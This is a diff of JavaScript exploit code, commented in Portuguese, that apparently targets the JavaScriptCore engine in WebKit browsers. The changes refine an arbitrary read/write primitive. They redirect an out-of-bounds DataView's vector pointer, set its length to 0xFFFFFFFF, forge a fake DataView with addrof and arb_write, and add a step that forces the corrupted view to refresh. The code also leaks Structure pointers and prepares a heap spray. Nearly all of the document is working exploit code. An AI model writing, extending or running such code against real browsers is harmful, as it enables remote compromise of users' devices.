@@ -75,9 +75,9 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         logFn(`[${FNAME}] DEBUG: Realizando snapshots de metadados do oob_dataview_real antes de vazar Structure*.`, 'debug');
         // Os offsets 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER) são assumidos como a base dos metadados do DataView no buffer OOB.
         // JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET (0x10), M_LENGTH_OFFSET (0x18), M_MODE_OFFSET (0x1C) são offsets dentro da estrutura do DataView.
-        m_vector_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8); // Offset 0x10 dentro do oob_dataview_real's metadata
-        m_length_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 4); // Offset 0x18
-        m_mode_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET, 4); // Offset 0x1C
+        m_vector_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
+        m_length_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 4);
+        m_mode_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET, 4);
         logFn(`[${FNAME}] DEBUG: Snapshots ORIGINAIS do OOB DV: m_vector=${m_vector_orig_snap_oob.toString(true)}, m_length=${toHex(m_length_orig_snap_oob)}, m_mode=${toHex(m_mode_orig_snap_oob)}`, 'debug');
 
         // Aponta o m_vector do oob_dataview_real para o endereço do DataView real
@@ -86,6 +86,18 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
         logFn(`[${FNAME}] oob_dataview_real m_vector redirecionado para ${real_data_view_addr.toString(true)} para vazamento de Structure*.`, "info", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- NOVO: Forçar um refresh/flush do DataView OOB aqui ---
+        try {
+            // Lendo e escrevendo um byte no início do DataView OOB pode forçar o engine a atualizar.
+            const temp_val = getOOBDataView().getUint8(0); // Lê o primeiro byte (deve ser 0)
+            getOOBDataView().setUint8(0, temp_val); // Escreve o mesmo byte de volta
+            logFn(`[${FNAME}] DEBUG: Tentativa de refresh explícito do oob_dataview_real concluída.`, 'debug', FNAME);
+            await pauseFn(5); // Uma pequena pausa pode ajudar
+        } catch (e_refresh) {
+            logFn(`[${FNAME}] ALERTA: Erro durante tentativa de refresh explícito do oob_dataview_real: ${e_refresh.message}`, 'warn', FNAME);
+        }
+        // --- FIM DO NOVO BLOCO ---
 
         // Agora, o oob_dataview_real pode ler o conteúdo do real_data_view_for_leak
         // A Structure* do DataView real está no offset 0 do DataView (JSCell.STRUCTURE_POINTER_OFFSET)
@@ -212,7 +224,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     // Redirecionar o m_vector do DataView forjado para o endereço desejado
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view); // Endereço do objeto que serve de corpo para o _fake_data_view
+    const fake_dv_backing_object_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); // Manipula o corpo do fake DataView para apontar para 'address'
@@ -359,7 +371,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
-
 
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
